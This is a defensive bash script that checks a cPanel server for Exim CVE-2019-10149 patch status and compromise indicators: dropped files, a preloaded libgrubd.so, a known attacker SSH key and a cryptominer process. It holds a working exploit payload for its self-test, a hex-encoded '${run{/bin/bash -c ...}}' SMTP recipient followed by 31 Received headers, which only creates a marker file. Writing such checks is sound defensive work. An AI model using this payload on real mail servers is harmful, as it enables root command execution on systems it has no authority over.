#!/usr/bin/env bash
## quick and dirty way to check for indication of compromise.
## feel free to make it pretty.
## if expect and openssl are available, it also checks for local
## exploitation.
## For testing remote exploit, check out eximrce.py

#fail() { echo -e "$(tput setaf 196)$*$(tput setaf 255)"; }
fail() { printf '\e[1;91m%s\e[0m\n' "$1"; }
#warn() { echo -e "$(tput setaf 190)$*$(tput setaf 255)"; }
warn() { printf '\e[1;93m%s\e[0m\n' "$1"; }
#pass() { echo -e "$(tput setaf 82)$*$(tput setaf 255)"; }
pass() { printf '\e[1;92m%s\e[0m\n' "$1"; }
#info() { echo -e "$(tput setaf 14)$*$(tput setaf 255)"; }
info() { printf '\e[1;96m%s\e[0m\n' "$1"; }
#white() { echo -e "$(tput setaf 255)$*$(tput setaf 255)"; }
white() { printf '\e[1;97m%s\e[0m\n' "$1"; }

EXIMVER="$(rpm -q exim | grep exim)"
if [[ -z $EXIMVER ]]; then
    pass "Exim not installed....exiting."
    exit 1
else
    #warn "Exim version: $EXIMVER"
    echo "$EXIMVER" | grep -Eq 'exim-4.91-4.cp1170.x86_64|exim-4.92-1.cp1178.x86_64|exim-4.92-1.cp1180.x86_64' &&
        pass "Exim version is verified to be patched: $EXIMVER" ||
        fail "Exim version is out of date or unknown: $EXIMVER"

fi

CPTIER="$(cat /etc/cpupdate.conf | grep CPANEL | cut -f2 -d=)"
CPFREQ="$(cat /etc/cpupdate.conf | grep UPDATES | cut -f2 -d=)"
info "cPanel update tier $CPTIER, frequency $CPFREQ"
CPVER="$(cat /usr/local/cpanel/version)"
echo "$CPVER" | grep -Eq "11.70.0.69|11.76.0.22|11.78.0.27|11.80.0.[0-9]{1,2}" &&
    pass "cPanel version is verified to be patched: $CPVER" ||
    fail "cPanel version is out of date or unknown: $CPVER"

info "Running additional Exim and cPanel checks"
# Check for fatal errors during the upgrade
grep -q FATAL /var/cpanel/updatelogs/last &&
    fail "Fatal errors detected in /var/cpanel/updatelogs/last:" &&
    grep --color=never FATAL /var/cpanel/updatelogs/last ||
    pass "No fatal errors detected in /var/cpanel/updatelogs/last"
# Check for automatic updates
grep -q UPDATES=daily /etc/cpupdate.conf &&
    pass "Automatic updates are enabled in /etc/cpupdate.conf" ||
    (
        fail "Automatic updates are disabled in /etc/cpupdate.conf"
        grep --color=never ^UPDATES /etc/cpupdate.conf
    )

BADPROC=$(pgrep kthrotlds)
RETCODE="1"

echo -e "\n==================================\n"

vuln-check() {
    rm -f /root/lweximtest
    PORT=$(grep 'daemon_smtp_ports' /etc/exim.conf | awk '{print $3}')
    OUTPUT=$(
        expect <<EOF
    set timeout 1
    # 465 doesn't work with starttls
	if { $PORT == 465 } {
			spawn openssl s_client -connect localhost:$PORT -crlf -quiet
    } else {
			spawn openssl s_client -connect localhost:$PORT -crlf -quiet -starttls smtp
	}
	expect "220 "
	send "ehlo test.com\r"
	expect "250 "
	send "mail from:<>\r"
	expect "250 "
	send "rcpt to:root+\\\${run{\\\x2fbin\\\x2fbash\\\x20\\\x2dc\\\x20\\\x22touch\\\x20\\\x2froot\\\x2flweximtest\\\x22\\\x20\\\x26}}@localhost\r"
	expect "250 "
	send "DATA\r"
	expect "354 "
	send "Received: 1
Received: 2
Received: 3
Received: 4
Received: 5
Received: 6
Received: 7
Received: 8
Received: 9
Received: 10
Received: 11
Received: 12
Received: 13
Received: 14
Received: 15
Received: 16
Received: 17
Received: 18
Received: 19
Received: 20
Received: 21
Received: 22
Received: 23
Received: 24
Received: 25
Received: 26
Received: 27
Received: 28
Received: 29
Received: 30
Received: 31\r" 
	send ".\r"
	expect "250 "
	send "quit"
EOF
    )
    RETCODE=$?
    #echo "Expect's return value: $?"
    #echo "Expect output: $OUTPUT"
    #echo "return code: $RETCODE"
}

if [[ -x "$(command -v expect)" ]] && [[ -x "$(command -v openssl)" ]]; then
    vuln-check 2 &>/dev/null
fi

#info "Checking for indication of compromise. Files below failed RPM verification. Additional review required."

#rpmverify crontabs | grep '/etc/crontab'
#rpm -q bind &>/dev/null && rpmverify bind
#rpm -q ntp &>/dev/null && rpmverify ntp

echo -e "\n"
#info "Outputs (if present) below could indicate server is likely compromised. Additional review required."

declare -a ioc=("/.cache"
    "/root/.cache/.a"
    "/root/.cache/.favicon.ico"
    "/root/.cache/.kswapd"
    "/root/.cache/.sysud"
    "/etc/cron.d/root"
    "/etc/cron.monthly/cronlog"
    "/var/spool/cron/crontabs/root"
    "/usr/local/bin/nptd"
    "/root/.editorinfo")

for i in "${ioc[@]}"; do
    if [[ -e "$i" ]]; then
        warn "$i exists, contents below"
        for j in $i; do
            if [ -d $j ]; then
                ls -lartch $j
            else
                head -c 100 "$j"
                echo -e "\n"
            fi
        done
    fi
done

if [[ -s /lib/libgrubd.so ]]; then
    fail "WARNING: Found '/lib/libgrubd.so'! The server should be considered compromised"
elif [[ -f /lib/libgrubd.so ]]; then
    info "INFO: our mitigation for '/lib/libgrubd.so' is present"
fi

if [[ -s /etc/ld.so.preload ]]; then
    warn "WARNING: Found '/etc/ld.so.preload' Checking.."
    if [[ ! -z $(grep -l '/lib/libgrubd.so' /etc/ld.so.preload) ]]; then
        fail "WARNING: Found '/lib/libgrubd.so' in '/etc/ld.so.preload'! Server should be considered compromised."
    else
        warn "/etc/ld.so.preload does not contain libgrubd.so, check it anyway"
    fi
elif [[ -e /etc/ld.so.preload ]]; then
    info "INFO: our mitigation for '/lib/libgrubd.so' is present"
fi

## attacker key in authorized_keys, host is user@localhost
if [[ -f /root/.ssh/authorized_keys ]]; then
    BADKEY="$(cat /root/.ssh/authorized_keys | grep "Z5DrA76WH user@localhost")"
    ## if known key is found
    if [[ ! -z "$BADKEY" ]]; then
        fail "\nAttacker key exists"
        fail "$BADKEY\n"
    fi
    UNKNOWNKEY="$(cat /root/.ssh/authorized_keys | grep -v "Z5DrA76WH" | grep " user@localhost")"
    if [[ ! -z "$UNKNOWNKEY" ]]; then
        fail "\nUnknown bad ssh key found, please notify secteam"
        fail "$UNKNOWNKEY\n"
    fi
fi

## checking to see if process kthrotlds is running, and kill it.
if [[ ! -z "$BADPROC" ]]; then
    fail "kthrotlds mining process found....killing $BADPROC"
    kill -9 $BADPROC >/dev/null 2>&1
fi

info "Checking for possible local exploit"
if [[ "$RETCODE" == 0 ]]; then
    TESTID=$(grep -rail '${run.*lweximtest' /var/spool/exim/input/ |sed -e 's/^.*\/\([a-zA-Z0-9-]*\)-[DH]$/\1/g')
    for i in $TESTID; do
        # this is needed to make sure test message was ran, on slow servers.
        #info "Test message found, forcing delivery $i"
        exim -M $i >/dev/null 2>&1
        # removing the test message
        exim -Mrm $i >/dev/null 2>&1
    done
    if [[ -f /root/lweximtest ]]; then
        fail "SERVER IS VULNERABLE TO LOCAL EXIM CVE-2019-10149"
    else
        pass "Server is NOT vulnerable to local EXIM CVE-2019-10149"
    fi
else
    info "Check failed. Exim log may indicate why."
fi

# remove any message in queue that contains the exploit
info "Checking for exploit message in queue, wait..."
BADMSG=$(grep -rail '${run' /var/spool/exim/input/ |sed -e 's/^.*\/\([a-zA-Z0-9-]*\)-[DH]$/\1/g')
if [[ ! -z "$BADMSG" ]]; then
    for i in $BADMSG; do
        warn "Exploit message found: $i. Removing..."
        exim -Mrm $i >/dev/null 2>&1
    done
else
    info "No exploit message found in queue."
fi

# remove test file
rm -f /root/lweximtest
